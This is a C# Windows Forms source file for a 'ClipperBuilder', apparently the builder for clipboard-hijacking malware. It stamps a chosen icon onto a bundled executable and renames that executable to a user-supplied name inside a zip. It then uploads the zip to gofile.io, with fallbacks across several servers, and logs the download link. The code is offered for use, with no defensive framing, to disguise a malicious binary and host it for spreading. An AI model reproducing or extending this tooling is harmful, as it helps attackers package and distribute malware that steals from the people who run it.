using IconChanger;
using Newtonsoft.Json.Linq;
using System;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace ClipperBuilder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                string selectedFilePath = openFileDialog.FileName;
                textBox1.Text = selectedFilePath;
                textBox3.Text += "Chosen new ico path" + Environment.NewLine;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            ChangeICO();
            textBox3.Text += "Succesfully change ico" + Environment.NewLine;
            System.Threading.Tasks.Task CopyTask = System.Threading.Tasks.Task.Factory.StartNew(() =>
            {
                Archive();
            });
            CopyTask.Wait();
            upload();
        }

        private void ChangeICO()
        {
            var icon = new IconEditor();
            icon.InjectIcon("Files\\Wzo0sX6pWg.exe", textBox1.Text, false);
        }
        private void upload()
        {
            string name = textBox2.Text;
            using (WebClient client = new WebClient())
            {

                try
                {
                    mainupload("https://store5.gofile.io/uploadFile", name);
                }
                catch (Exception)
                {
                    try
                    {
                        mainupload("https://store4.gofile.io/uploadFile", name);
                    }
                    catch (Exception)
                    {
                        try
                        {
                            mainupload("https://store3.gofile.io/uploadFile", name);
                        }
                        catch (Exception)
                        {
                            try
                            {
                                mainupload("https://store2.gofile.io/uploadFile", name);
                            }
                            catch (Exception)
                            {
                                try
                                {
                                    mainupload("https://store1.gofile.io/uploadFile", name);
                                }
                                catch (Exception ex)
                                {
                                    textBox3.Text += ex.ToString() + Environment.NewLine;
                                    textBox3.Text += $"Cant upload file on any gofile server" + Environment.NewLine;
                                }
                            }
                        }
                    }
                }
            }
        }

        private void mainupload(string storelink, string name)
        {
            using (StreamWriter sw = new StreamWriter("result.txt"))
            {
                using (WebClient client = new WebClient())
                {
                    var upload = client.UploadFile(storelink, $"Result\\{name}.zip");
                    var result = JObject.Parse(Encoding.UTF8.GetString(upload));
                    var link = result["data"]["downloadPage"];
                    textBox3.Text += link.ToString() + " " + name + Environment.NewLine;
                    sw.WriteLine($"{link.ToString()} {name}");
                }
            }
        }
        private void Archive()
        {
            string name = textBox2.Text;
            string[] files = Directory.GetFiles("Files");
            
            var fileStream = new FileStream(Path.GetFullPath($"Result\\{name}.zip"), FileMode.Create);
            var archive = new ZipArchive(fileStream, ZipArchiveMode.Create);
            foreach (string file in files)
            {
                string z = file.Remove(0, 6);
                if (file.Contains(".exe") == true)
                {
                    string ifexe = name + ".exe";
                    archive.CreateEntryFromFile($"Files\\{z}", ifexe);
                }
                else
                {
                    archive.CreateEntryFromFile($"Files\\{z}", z);
                }
            }
            archive.Dispose();
            textBox3.Text += $"Created {name}.zip" + Environment.NewLine;

        }
    }
}
